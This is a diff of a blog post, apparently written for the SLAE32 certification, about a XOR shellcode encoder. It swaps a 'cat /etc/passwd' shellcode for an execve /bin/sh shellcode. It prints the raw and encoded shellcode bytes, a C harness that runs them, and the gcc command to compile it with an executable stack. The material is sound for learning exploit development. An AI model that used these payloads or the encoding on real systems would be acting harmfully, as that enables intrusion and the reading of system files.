@@ -16,7 +16,7 @@ Why? the goal of that certification is to practice and learn how to solve each a
 <title>Assignment N°4 - Shellcode Encoder (NASM) | Phrozen</title>
 <link rel="icon" href="/images/favicon.ico" type="image/x-icon">
 <link rel="stylesheet" href="/book.min.63abd10f627a7a06406140610b7ce76d028552de10d790fcb09f332349c39047.css" integrity="sha256-Y6vRD2J6egZAYUBhC3znbQKFUt4Q15D8sJ8zI0nDkEc=">
-<script defer src="/en.search.min.20459bf69e2200e22e05e2d462c5c76a0aaf6cd5a2e86247778ba1a2621b0393.js" integrity="sha256-IEWb9p4iAOIuBeLUYsXHagqvbNWi6GJHd4uhomIbA5M="></script>
+<script defer src="/en.search.min.e5c252cb1d9b09f8f6439728cc7cb1f3da0dcaf7ddae7a8298ef0c23b4612cff.js" integrity="sha256-5cJSyx2bCfj2Q5cozHyx89oNyvfdrnqCmO8MI7RhLP8="></script>
 
 <script type="application/javascript">
 var doNotTrack = false;
@@ -836,26 +836,24 @@ success(f&quot;Shellcode successfully encoded, payload size: {size}&quot;)
 <li><code>-p</code> : Check if final payload is really free of badchars (Paranoid mode).</li>
 </ul>
 <h3 id="example">Example</h3>
-<p>We will use our <code>cat /etc/passwd</code> shellcode available <a href="https://www.phrozen.io/docs/linux/slae32/ex2-reverseshell/">there</a>.</p>
-<p>local@user:# <code>./xor-encoder.py -s &quot;\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x69\x6e\x2f\x2f\x68\x2f\x2f\x2f\x62\x89\xe3\x66\xb8\x2d\x63\x50\x31\xc0\x89\xe2\x50\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x20\x2f\x65\x74\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe6\x50\x56\x52\x53\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80&quot; -b &quot;\x0a\x0d&quot; -v -p</code></p>
-<p><img src="https://i.ibb.co/J2FLvDK/Screenshot-2020-06-04-at-15-25-39.png" alt="Example Picture" /></p>
+<p>We will use <code>execve-stack</code> as shellcode to encode.</p>
+<p>local@user:# <code>./xor-encoder.py -s &quot;\xeb\x1a\x5e\x31\xdb\x88\x5e\x07\x89\x76\x08\x89\x5e\x0c\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\x31\xc0\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43&quot; -b &quot;\x0a\x0d&quot; -v -p</code></p>
+<p><img src="/images/202006/Screenshot-2020-06-05-at-17.16.38.png" alt="Example Picture" /></p>
 <h4 id="test-encoded-shellcode">Test encoded shellcode</h4>
 <pre><code>#include&lt;stdio.h&gt;
 #include&lt;string.h&gt;
 
-// Shellcode size = 173
-unsigned char code[] = \
-        &quot;\xeb\x1a\x5e\x31\xc9\x31\xc0\x31\xdb\xb1\x46\x8a\x24\x1e\x8a\x44&quot;
-        &quot;\x1e\x01\x30\xc4\x88\x26\x43\x46\xe2\xf1\xeb\x05\xe8\xe1\xff\xff&quot;
-        &quot;\xff\x14\x25\x79\xb9\x88\xd8\x56\x3e\x1e\x7c\x3e\x5f\xaf\xdc\xda&quot;
-        &quot;\xb2\xa5\xcd\x6d\x04\x60\x0e\x52\x7d\xb5\x9a\x8f\xe7\xbc\x93\xd2&quot;
-        &quot;\xfd\x4c\x63\x5c\x3e\x06\x8f\x1d\xfe\xf4\x92\x66\xde\xe8\xc5\xd3&quot;
-        &quot;\xb0\xff\xaf\x93\xa2\x62\xa2\x79\xf0\x82\x60\xa2\xf2\xfb\x93\x78&quot;
-        &quot;\x0b\x85\xf6\x26\x51\x5c\x38\xbb\xd3\x79\x1a\x4d\x62\x6a\x1a\xfa&quot;
-        &quot;\x9b\x58\x30\x9b\xbb\x92\xbd\xdb\xbe\x6f\x1b\x1e\x76\xe2\xcd\x3a&quot;
-        &quot;\x59\x09\x68\x58\x2c\xa0\xc8\x4e\x61\x81\xe3\x0f\x66\x10\x7e\xc0&quot;
-        &quot;\x49\x68\x8e\x21\x71\x26\x70\x47\x15\x2c\x7f\xcf\x46\x05\xe4\x11&quot;
-        &quot;\x41\x4b\xc2\x3a\xd8\x28\x98\x41\x4a\x6d\xa0\x16\x96&quot;;
+// Shellcode size = 131                                                                               
+unsigned char code[] = \                                                                              
+        &quot;\xeb\x1a\x5e\x31\xc9\x31\xc0\x31\xdb\xb1\x31\x8a\x24\x1e\x8a\x44&quot;                            
+        &quot;\x1e\x01\x30\xc4\x88\x26\x43\x46\xe2\xf1\xeb\x05\xe8\xe1\xff\xff&quot;                            
+        &quot;\xff\xbf\x54\xd4\xce\x7c\x22\x0c\x3d\x5d\x86\x94\x1c\x5b\x05\xd9&quot;                            
+        &quot;\xde\xd0\x59\x34\x42\xf4\xfc\x67\xee\x65\x3b\xe6\xea\x40\xcd\x32&quot;                            
+        &quot;\x2c\x53\xde\x6d\x23\xc5\xcd\xf6\x7b\x33\x65\xc5\xc9\x0b\x3a\x9c&quot;                            
+        &quot;\x5c\x2e\x9e\x4f\x44\x99\x54\xc7\x47\x5d\xb5\x22\xc3\x31\xce\x4c&quot;                            
+        &quot;\xb3\x52\xad\x5d\x72\x89\xeb\x5a\x33\x31\x5f\xdb\xf4\xfe\x8d\x44&quot;                            
+        &quot;\x2c\xa8\xe9\x76\x34\x64\x26\x7e\x3c\x8c\xce\xbf\xfc\xfb\xb8\x72&quot;                            
+        &quot;\x31\x21\x62&quot;; 
 
 main()
 {
@@ -866,7 +864,7 @@ main()
 	ret();
 }
 </code></pre><p>local@user:# <code>gcc shellcode.c -o shellcode -z execstack &amp;&amp; ./shellcode</code></p>
-<p><img src="https://i.ibb.co/0FpGPZR/Screenshot-2020-06-04-at-15-29-03.png" alt="Shellcode Exec" /></p>
+<p><img src="/images/202006/Screenshot-2020-06-05-at-17.18.14.png" alt="Shellcode Exec" /></p>
 <h1 id="afterword">Afterword</h1>
 <p>Encoder is available in the following Github repository : <a href="https://github.com/DarkCoderSc/slae32-xor-encoder">https://github.com/DarkCoderSc/slae32-xor-encoder</a></p>
 </article>
